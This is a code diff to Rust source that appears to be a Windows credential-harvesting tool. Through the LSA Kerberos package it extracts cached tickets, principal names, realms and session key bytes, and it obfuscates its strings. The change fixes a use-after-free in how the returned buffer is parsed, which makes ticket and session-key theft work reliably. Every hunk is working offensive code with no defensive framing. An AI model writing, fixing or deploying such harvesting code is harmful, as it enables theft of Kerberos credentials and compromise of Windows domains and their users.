@@ -328,13 +328,19 @@ unsafe fn lookup_package(
 }
 
 /// Call an authentication package and return the response buffer.
-/// The caller is responsible for freeing the buffer with `LsaFreeReturnBuffer`.
+/// Returns `(data_vec, original_buffer_address, protocol_status)`.
+///
+/// The LSA return buffer is copied into a `Vec` and then freed via
+/// `LsaFreeReturnBuffer`.  Callers receive the copy *and* the original buffer
+/// address (as `usize`) so that embedded pointers whose values are offsets into
+/// the LSA block can be resolved against the `Vec` copy instead of
+/// dereferencing freed memory.
 unsafe fn call_package(
     apis: &LsaApis,
     lsa_handle: HANDLE,
     package_id: ULONG,
     submit_buffer: &[u8],
-) -> Result<(Vec<u8>, i32)> {
+) -> Result<(Vec<u8>, usize, i32)> {
     let mut return_buffer: *mut u8 = ptr::null_mut();
     let mut return_length: ULONG = 0;
     let mut protocol_status: i32 = 0;
@@ -360,6 +366,8 @@ unsafe fn call_package(
         );
     }
 
+    let original_ptr = return_buffer as usize;
+
     let result = if !return_buffer.is_null() && return_length > 0 {
         let slice = std::slice::from_raw_parts(return_buffer, return_length as usize);
         let data = slice.to_vec();
@@ -369,7 +377,7 @@ unsafe fn call_package(
         Vec::new()
     };
 
-    Ok((result, protocol_status))
+    Ok((result, original_ptr, protocol_status))
 }
 
 // ── MSV1_0 structures (kept for reference; unused by current extraction) ────
@@ -515,11 +523,11 @@ fn harvest_untrusted(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
             )
         };
 
-        if let Ok((resp, _proto_status)) =
+        if let Ok((resp, base_ptr, _proto_status)) =
             unsafe { call_package(apis_ref, lsa.as_handle(), kerb_pkg, tkt_bytes) }
         {
             if !resp.is_empty() {
-                parse_kerb_tkt_cache(&resp, &mut credentials);
+                parse_kerb_tkt_cache(&resp, base_ptr, &mut credentials);
             }
         }
 
@@ -546,11 +554,11 @@ fn harvest_untrusted(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
             )
         };
 
-        if let Ok((resp, proto_status)) =
+        if let Ok((resp, base_ptr, proto_status)) =
             unsafe { call_package(apis_ref, lsa.as_handle(), kerb_pkg, retrieve_bytes) }
         {
             if !resp.is_empty() {
-                parse_kerb_retrieve_ticket(&resp, proto_status, &mut credentials);
+                parse_kerb_retrieve_ticket(&resp, base_ptr, proto_status, &mut credentials);
             }
         }
     }
@@ -667,10 +675,10 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
             )
         };
 
-        if let Ok((resp, _)) =
+        if let Ok((resp, base_ptr, _)) =
             unsafe { call_package(apis_ref, _lsa.as_handle(), kerb_pkg, tkt_bytes) }
         {
-            parse_kerb_tkt_cache(&resp, &mut credentials);
+            parse_kerb_tkt_cache(&resp, base_ptr, &mut credentials);
         }
 
         if CANCELLED.load(Ordering::Relaxed) || std::time::Instant::now() > deadline {
@@ -693,10 +701,10 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
             )
         };
 
-        if let Ok((resp, proto_status)) =
+        if let Ok((resp, base_ptr, proto_status)) =
             unsafe { call_package(apis_ref, _lsa.as_handle(), kerb_pkg, retrieve_bytes) }
         {
-            parse_kerb_retrieve_ticket(&resp, proto_status, &mut credentials);
+            parse_kerb_retrieve_ticket(&resp, base_ptr, proto_status, &mut credentials);
         }
 
         if CANCELLED.load(Ordering::Relaxed) || std::time::Instant::now() > deadline {
@@ -743,7 +751,7 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
 /// Buffer pointers reference memory *within* the same LSA-allocated block
 /// (or in the caller's address space via LSA memory mapping).  We read
 /// directly from the pointer rather than range-checking against our slice.
-fn parse_kerb_tkt_cache(resp: &[u8], credentials: &mut Vec<WhisperedCredential>) {
+fn parse_kerb_tkt_cache(resp: &[u8], base_ptr: usize, credentials: &mut Vec<WhisperedCredential>) {
     if resp.len() < 8 {
         return;
     }
@@ -775,11 +783,11 @@ fn parse_kerb_tkt_cache(resp: &[u8], credentials: &mut Vec<WhisperedCredential>)
         //   ServerRealm  (UNICODE_STRING, 16 bytes at base+48)
         //   ... timestamps, encryption type, ticket flags
 
-        if let Some(client_name) = read_unicode_string_at(resp, base) {
-            if let Some(client_realm) = read_unicode_string_at(resp, base + 16) {
-                let server_name = read_unicode_string_at(resp, base + 32)
+        if let Some(client_name) = read_unicode_string_at(resp, base, base_ptr) {
+            if let Some(client_realm) = read_unicode_string_at(resp, base + 16, base_ptr) {
+                let server_name = read_unicode_string_at(resp, base + 32, base_ptr)
                     .unwrap_or_default();
-                let server_realm = read_unicode_string_at(resp, base + 48)
+                let server_realm = read_unicode_string_at(resp, base + 48, base_ptr)
                     .unwrap_or_default();
 
                 let description = if !server_name.is_empty() {
@@ -821,6 +829,7 @@ fn parse_kerb_tkt_cache(resp: &[u8], credentials: &mut Vec<WhisperedCredential>)
 ///   ... UNICODE_STRING fields for client / server names
 fn parse_kerb_retrieve_ticket(
     resp: &[u8],
+    base_ptr: usize,
     _proto_status: i32,
     credentials: &mut Vec<WhisperedCredential>,
 ) {
@@ -853,17 +862,21 @@ fn parse_kerb_retrieve_ticket(
     };
 
     // Try to read the session key bytes (up to 32 bytes for AES-256).
+    // The key_value_ptr pointed into the original LSA return buffer which
+    // has already been freed.  Compute the offset and read from our copy.
     let key_hex = if key_value_ptr != 0 && key_length > 0 && key_length <= 64 {
-        // SAFETY: The buffer pointer is in the LSA-allocated return buffer.
-        // LsaFreeReturnBuffer frees the entire block; the pointer is valid
-        // until we free the buffer.
-        let key_ptr = key_value_ptr as *const u8;
+        let key_offset = (key_value_ptr as usize).saturating_sub(base_ptr);
         let safe_len = key_length.min(32);
-        // Use volatile read to avoid the compiler eliding the read.
-        let key_bytes: Vec<u8> = (0..safe_len)
-            .map(|j| unsafe { std::ptr::read_volatile(key_ptr.add(j)) })
-            .collect();
-        key_bytes.iter().map(|b| format!("{:02x}", b)).collect()
+        if key_offset + safe_len <= resp.len() {
+            resp[key_offset..key_offset + safe_len]
+                .iter()
+                .map(|b| format!("{:02x}", b))
+                .collect()
+        } else {
+            String::from_utf8_lossy(&string_crypt::enc_str!("N/A"))
+                .trim_end_matches('\0')
+                .to_string()
+        }
     } else {
         String::from_utf8_lossy(&string_crypt::enc_str!("N/A"))
             .trim_end_matches('\0')
@@ -878,13 +891,13 @@ fn parse_kerb_retrieve_ticket(
     // Scan for UNICODE_STRING fields in the tail of the response.
     // Client name is typically at offset 80+ and realm at 96+.
     for off in (72..resp.len().saturating_sub(32)).step_by(8) {
-        if let Some(s) = read_unicode_string_at(resp, off) {
+        if let Some(s) = read_unicode_string_at(resp, off, base_ptr) {
             if s.contains('@') || s.contains('\\') || s.contains('/') {
                 // Looks like a UPN or domain\user — this is the client name.
                 client_name = s;
                 // Next UNICODE_STRING after this one is usually the realm.
                 if off + 16 <= resp.len() {
-                    if let Some(realm) = read_unicode_string_at(resp, off + 16) {
+                    if let Some(realm) = read_unicode_string_at(resp, off + 16, base_ptr) {
                         client_realm = realm;
                     }
                 }
@@ -915,15 +928,13 @@ fn parse_kerb_retrieve_ticket(
 
 /// Read a UNICODE_STRING at the given offset within a response buffer.
 ///
-/// LSA return buffers are allocated in the caller's address space by the LSA
-/// subprocess.  The `Buffer` pointer inside each `UNICODE_STRING` references
-/// memory *within* the same allocated block — NOT within our `resp` slice.
-/// The old code range-checked `buf_ptr` against `resp.as_ptr()`, which almost
-/// always fails because the pointer is to a *different* heap allocation.
-///
-/// Fix: Dereference the pointer directly — it is valid for the lifetime of
-/// the LSA return buffer (freed by `LsaFreeReturnBuffer` in `call_package`).
-fn read_unicode_string_at(resp: &[u8], offset: usize) -> Option<String> {
+/// `base_ptr` is the original address of the LSA return buffer (now freed).
+/// The `UNICODE_STRING.Buffer` pointer value pointed into that LSA buffer.
+/// Since `call_package()` already copied the entire LSA buffer into `resp`
+/// and then freed the original, we compute `Buffer - base_ptr` to find the
+/// string data's offset within `resp` and read from the copy instead of
+/// dereferencing the now-dangling pointer.
+fn read_unicode_string_at(resp: &[u8], offset: usize, base_ptr: usize) -> Option<String> {
     if offset + 16 > resp.len() {
         return None;
     }
@@ -945,14 +956,24 @@ fn read_unicode_string_at(resp: &[u8], offset: usize) -> Option<String> {
         return None;
     }
 
-    // SAFETY: The UNICODE_STRING's Buffer pointer references memory in the
-    // LSA-allocated return buffer.  It is valid until LsaFreeReturnBuffer is
-    // called, which happens in `call_package` after this function returns.
-    let wide_slice = unsafe {
-        std::slice::from_raw_parts(uni.Buffer as *const u16, length / 2)
-    };
+    // Compute the offset of the string data within the original LSA buffer.
+    // The UNICODE_STRING.Buffer pointer pointed into the LSA return buffer
+    // which was freed by call_package().  However, we already have a full
+    // copy in `resp`, so we compute the offset and read from there.
+    let buf_addr = uni.Buffer as usize;
+    let string_offset = buf_addr.saturating_sub(base_ptr);
 
-    Some(String::from_utf16_lossy(wide_slice))
+    if string_offset + length > resp.len() {
+        return None; // Pointer was out of bounds.
+    }
+
+    // Read the string data directly from our copy of the buffer.
+    let wide: Vec<u16> = resp[string_offset..string_offset + length]
+        .chunks_exact(2)
+        .map(|c| u16::from_le_bytes([c[0], c[1]]))
+        .collect();
+
+    Some(String::from_utf16_lossy(&wide))
 }
 
 // ── Public API ─────────────────────────────────────────────────────────────
